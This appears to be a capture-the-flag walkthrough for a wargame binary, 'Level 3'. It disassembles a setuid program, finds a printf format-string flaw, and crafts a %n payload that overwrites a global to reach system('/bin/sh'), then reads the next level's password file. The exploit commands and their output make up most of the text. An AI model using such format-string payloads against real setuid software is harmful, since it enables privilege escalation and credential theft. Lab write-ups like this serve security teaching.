# Level 3


<br>

### >> [Flag file](./flag) <<

<br>

### >> [Source file](./source.c) <<

<br>


## TL;DR:

```bash
printf '\x8c\x98\x04\x08 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%%x %%x %%x %%n\n' > /tmp/c && cat /tmp/c - | ./level3
```

And inside the program:
```bash
cat /home/user/level4/.pass
```

<br>


## Explanation:


#### Step 1:

- What's in the home directory:
```bash
ls -la
```

> ```
> total 17
> dr-xr-x---+ 1 level3 level3   80 Mar  6  2016 .
> dr-x--x--x  1 root   root    340 Sep 23  2015 ..
> -rw-r--r--  1 level3 level3  220 Apr  3  2012 .bash_logout
> -rw-r--r--  1 level3 level3 3530 Sep 23  2015 .bashrc
> -rwsr-s---+ 1 level4 users  5366 Mar  6  2016 level3
> -rw-r--r--+ 1 level3 level3   65 Sep 23  2015 .pass
> -rw-r--r--  1 level3 level3  675 Apr  3  2012 .profile
> ```


#### Step 2:

- Let's see what functions are in the `level3` binary:
```bash
gdb -q ./level3
info function
```

> ```asm
> All defined functions:
> 
> Non-debugging symbols:
> 0x08048344  _init
> 0x08048390  printf
> 0x08048390  printf@plt
> 0x080483a0  fgets
> 0x080483a0  fgets@plt
> 0x080483b0  fwrite
> 0x080483b0  fwrite@plt
> 0x080483c0  system
> 0x080483c0  system@plt
> 0x080483d0  __gmon_start__
> 0x080483d0  __gmon_start__@plt
> 0x080483e0  __libc_start_main
> 0x080483e0  __libc_start_main@plt
> 0x080483f0  _start
> 0x08048420  __do_global_dtors_aux
> 0x08048480  frame_dummy
> 0x080484a4  v
> 0x0804851a  main
> 0x08048530  __libc_csu_init
> 0x080485a0  __libc_csu_fini
> 0x080485a2  __i686.get_pc_thunk.bx
> 0x080485b0  __do_global_ctors_aux
> 0x080485dc  _fini
> ```
> We have 2 functions:
> - v
> - main

#### Step 3:


- Let's disassemble those functions:

```bash
disassemble v
disassemble main
```

>```asm
> Dump of assembler code for function v:
>    0x080484a4 <+0>:   push   %ebp
>    0x080484a5 <+1>:   mov    %esp,%ebp
>    0x080484a7 <+3>:   sub    $0x218,%esp
>    0x080484ad <+9>:   mov    0x8049860,%eax
>    0x080484b2 <+14>:  mov    %eax,0x8(%esp)
>    0x080484b6 <+18>:  movl   $0x200,0x4(%esp)
>    0x080484be <+26>:  lea    -0x208(%ebp),%eax
>    0x080484c4 <+32>:  mov    %eax,(%esp)
>    0x080484c7 <+35>:  call   0x80483a0 <fgets@plt>
>    0x080484cc <+40>:  lea    -0x208(%ebp),%eax
>    0x080484d2 <+46>:  mov    %eax,(%esp)
>    0x080484d5 <+49>:  call   0x8048390 <printf@plt>
>    0x080484da <+54>:  mov    0x804988c,%eax
>    0x080484df <+59>:  cmp    $0x40,%eax
>    0x080484e2 <+62>:  jne    0x8048518 <v+116>
>    0x080484e4 <+64>:  mov    0x8049880,%eax
>    0x080484e9 <+69>:  mov    %eax,%edx
>    0x080484eb <+71>:  mov    $0x8048600,%eax
>    0x080484f0 <+76>:  mov    %edx,0xc(%esp)
>    0x080484f4 <+80>:  movl   $0xc,0x8(%esp)
>    0x080484fc <+88>:  movl   $0x1,0x4(%esp)
>    0x08048504 <+96>:  mov    %eax,(%esp)
>    0x08048507 <+99>:  call   0x80483b0 <fwrite@plt>
>    0x0804850c <+104>: movl   $0x804860d,(%esp)
>    0x08048513 <+111>: call   0x80483c0 <system@plt>
>    0x08048518 <+116>: leave  
>    0x08048519 <+117>: ret    
> End of assembler dump.
>```
> Here the only purpose of the `v` function is to read input and print it. But we can see that if the value of `eax` is equal to `0x40` (64 in decimal) it will call the `system` function with the argument `/bin/sh`. And for that we can just use the `%n` of the `printf` function above the comparison to write the value `0x40` in the address of `eax`.
>```
> Dump of assembler code for function main:
>    0x0804851a <+0>:   push   %ebp
>    0x0804851b <+1>:   mov    %esp,%ebp
>    0x0804851d <+3>:   and    $0xfffffff0,%esp
>    0x08048520 <+6>:   call   0x80484a4 <v>
>    0x08048525 <+11>:  leave  
>    0x08048526 <+12>:  ret    
> End of assembler dump.
>```
> Here the only purpose of the `main` function is to call the `v` function.
>


#### Step 4:

Look what address is overwritten by the `printf` function:
```bash
printf "ABCD %%x %%x %%x %%x %%x %%x \n" | ./level3
ABCD 200 b7fd1ac0 b7ff37d0 44434241 20782520 25207825
```

Here we can see that the address is overwritten by the `printf` function. So we can use the `0x804988c` address to write the value `0x40` in it.

```bash
printf "\x8c\x98\x04\x08 %%x %%x %%x %%x\n \n" | ./level3
200 b7fd1ac0 b7ff37d0 804988c
```

the address `0x804988c` corresponds to the `eax` register in the `v` function and the value of `eax` is the length of the input string. So we can use the `%n` format specifier to write the value `0x40` in it.

```bash
printf '\x8c\x98\x04\x08 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%%x %%x %%x %%n\n' > /tmp/c
cat /tmp/c - | ./level3
� AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA200 b7fd1ac0 b7ff37d0 
Wait what?!
```

Finally we can see that the value of `eax` is now `0x40` and the program will call the `system` function with the argument `/bin/sh`. And we can use the `cat /home/user/level4/.pass` command to get the flag.

```bash
cat /home/user/level4/.pass
```

<br>

[[<<]](/level1/walkthrough.md) &nbsp; [[Back to main page]](/Readme.md) &nbsp; [[>>]](/level3/walkthrough.md)
